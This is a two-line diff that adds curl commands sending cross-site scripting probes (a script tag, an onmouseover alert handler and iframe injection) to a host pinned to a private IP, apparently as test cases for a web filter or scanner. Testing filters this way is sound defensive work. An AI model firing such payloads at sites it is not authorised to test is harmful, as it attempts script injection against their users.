@@ -1,0 +1,2 @@
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/index.html?>/<script>alert);/="
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/index.html?%22+onmouseover%3d%22alert(1111)%22%3E+DANUX%3C/iframe%3E%20%3Ciframe%20a%3D%22="
